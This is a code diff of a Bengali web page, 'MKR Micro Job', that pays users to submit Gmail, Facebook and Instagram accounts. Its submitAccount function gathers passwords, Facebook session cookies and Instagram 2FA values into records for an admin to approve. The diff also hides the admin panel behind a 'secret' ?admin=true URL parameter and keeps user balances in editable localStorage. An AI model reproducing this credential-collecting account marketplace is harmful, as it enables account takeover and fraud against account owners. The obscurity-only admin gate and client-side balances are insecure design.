@@ -784,7 +784,6 @@
             <li onclick="toggleSidebar(); showPage('gmailPage');"><i class="fa-solid fa-envelope"></i> জিমেইল সেল</li>
             <li onclick="toggleSidebar(); showPage('facebookPage');"><i class="fa-brands fa-facebook"></i> ফেসবুক সেল</li>
             <li onclick="toggleSidebar(); showPage('instagramPage');"><i class="fa-brands fa-instagram"></i> ইনস্টাগ্রাম সেল</li>
-            <li onclick="toggleSidebar(); showPage('adminLoginModal');"><i class="fa-solid fa-user-shield" style="color: #fbbf24;"></i> এডমিন প্যানেল</li>
             <li onclick="toggleSidebar(); showPage('registerPage');"><i class="fa-solid fa-user-plus"></i> রেজিস্ট্রেশন পেজ</li>
             <li onclick="toggleSidebar(); showPage('loginPage');"><i class="fa-solid fa-right-to-bracket"></i> লগইন পেজ</li>
         </ul>
@@ -881,7 +880,7 @@
         </div>
     </div>
 
-    <!-- এডমিন সিক্রেট লগইন পেজ -->
+    <!-- এডমিন সিক্রেট লগইন পেজ (শুধুমাত্র সিক্রেট লিংকের মাধ্যমে আসবে, ইউজারদের মেনুতে নেই) -->
     <div id="adminLoginModal" class="section-page">
         <header class="navbar">
             <div class="nav-left">
@@ -959,9 +958,8 @@
                     <i class="fa-solid fa-user"></i>
                 </div>
                 <div class="profile-dropdown" id="profileDropdown">
-                    <div class="dropdown-item" onclick="openProfilePage()"><i class="fa-solid fa-user"></i> Profile</div>
+                    <div class="dropdown-item" onclick="openProfilePage()"><i class="fa-solid fa-user"></i> Profile & Task Status</div>
                     <div class="dropdown-item" onclick="openLeaderboardPage()"><i class="fa-solid fa-trophy" style="color: #fbbf24;"></i> Top (100) Reffered</div>
-                    <div class="dropdown-item" onclick="showPage('adminLoginModal')"><i class="fa-solid fa-user-shield" style="color: #fbbf24;"></i> Admin Panel</div>
                     <div class="dropdown-item logout" onclick="handleLogout()"><i class="fa-solid fa-power-off"></i> Logout</div>
                 </div>
             </div>
@@ -969,7 +967,7 @@
 
         <div class="notice-bar">
             <i class="fa-solid fa-bullhorn"></i>
-            <span>MKR Micro Job | কাজ করে সহজেই আয় করুন ঘরে বসে। (পাসওয়ার্ড প্রতিদিন রাত ১০:০০ টায় অটো আপডেট হয়)</span>
+            <span>MKR Micro Job | কাজ করে সহজেই আয় করুন ঘরে বসে। (পাসওয়ার্ড প্রতিদিন রাত ১০টায় অটো আপডেট হয়)</span>
         </div>
 
         <div class="dashboard">
@@ -1035,7 +1033,7 @@
         </div>
     </div>
 
-    <!-- প্রোফাইল পেজ (সাকসেস ও রিজেক্ট কাউন্টারসহ) -->
+    <!-- প্রোফাইল পেজ (ইউজার শুধুমাত্র তার নিজের কাজের স্ট্যাটাস দেখবে) -->
     <div id="profilePage" class="section-page">
         <header class="navbar">
             <div class="nav-left">
@@ -1092,7 +1090,7 @@
             </div>
 
             <div class="task-history-card">
-                <h3 style="color: #00f2fe; font-size: 14px; margin-bottom: 10px;"><i class="fa-solid fa-list-check"></i> কাজের লাইভ হিস্ট্রি লিস্ট</h3>
+                <h3 style="color: #00f2fe; font-size: 14px; margin-bottom: 10px;"><i class="fa-solid fa-list-check"></i> আমার জমা দেওয়া কাজের হিস্ট্রি</h3>
                 <div style="overflow-x: auto;">
                     <table class="history-table">
                         <thead>
@@ -1527,6 +1525,13 @@
 
         window.onload = function() {
             const urlParams = new URLSearchParams(window.location.search);
+            
+            // সিক্রেট অ্যাডমিন লিংকের জন্য চেকিং (যেমন: yoursite.com/?admin=true)
+            if (urlParams.get('admin') === 'true') {
+                showPage('adminLoginModal');
+                return;
+            }
+
             const refUser = urlParams.get('ref');
             if (refUser) {
                 localStorage.setItem('referredBy', refUser);
@@ -1771,25 +1776,23 @@
         function submitAccount(event, platform, rate) {
             event.preventDefault();
             let details = "";
-            let usernameKey = "";
 
             if (platform === 'Gmail') {
-                usernameKey = document.getElementById('gmailEmail').value;
+                let email = document.getElementById('gmailEmail').value;
                 let pass = document.getElementById('gmailPass').value;
-                details = `Email: ${usernameKey}\n🔑 পাসওয়ার্ড: ${pass}`;
+                details = `Email: ${email}\n🔑 পাসওয়ার্ড: ${pass}`;
             } else if (platform === 'Facebook') {
-                usernameKey = document.getElementById('fbUid').value;
+                let uid = document.getElementById('fbUid').value;
                 let pass = document.getElementById('fbPass').value;
                 let cookies = document.getElementById('fbCookies').value;
-                details = `UID/User: ${usernameKey}\n🔑 পাসওয়ার্ড: ${pass}\n🍪 Cookies: ${cookies}`;
+                details = `UID/User: ${uid}\n🔑 পাসওয়ার্ড: ${pass}\n🍪 Cookies: ${cookies}`;
             } else if (platform === 'Instagram') {
-                usernameKey = document.getElementById('instaUser').value;
+                let username = document.getElementById('instaUser').value;
                 let pass = document.getElementById('instaPass').value;
                 let twoFa = document.getElementById('insta2fa').value;
-                details = `Username: ${usernameKey}\n🔑 পাসওয়ার্ড: ${pass}\n🛡️ 2FA: ${twoFa}`;
+                details = `Username: ${username}\n🔑 পাসওয়ার্ড: ${pass}\n🛡️ 2FA: ${twoFa}`;
             }
 
-            let tasks = JSON.parse(localStorage.getItem('userTasks') || '[]');
             let currentUserName = localStorage.getItem('savedName') || 'অজ্ঞাত ইউজার';
             let currentUserPhone = localStorage.getItem('savedPhone') || 'নম্বর পাওয়া যায়নি';
             
@@ -1915,14 +1918,12 @@
                 return;
             }
 
-            // যদি আগে সাকসেস না থাকে এবং এখন সাকসেস করা হয়, তবে ব্যালেন্স যোগ হবে
             if (currentTask.status !== 'Success' && newStatus === 'Success') {
                 let currentBal = parseFloat(localStorage.getItem('userBalance') || '0.00');
                 let addAmt = currentTask.rate || (currentTask.platform === 'Gmail' ? 15.70 : (currentTask.platform === 'Facebook' ? 5.70 : 4.00));
                 localStorage.setItem('userBalance', (currentBal + addAmt).toFixed(2));
                 updateBalanceDisplay();
             } 
-            // যদি কাজটা আগে সাকসেস করা ছিল কিন্তু এখন রিজেক্ট (Failed) করা হয়, তবে ব্যালেন্স থেকে সমপরিমাণ টাকা কেটে নেওয়া হবে যাতে ভুল ব্যালেন্স না থাকে
             else if (currentTask.status === 'Success' && newStatus === 'Failed') {
                 let currentBal = parseFloat(localStorage.getItem('userBalance') || '0.00');
                 let subAmt = currentTask.rate || (currentTask.platform === 'Gmail' ? 15.70 : (currentTask.platform === 'Facebook' ? 5.70 : 4.00));
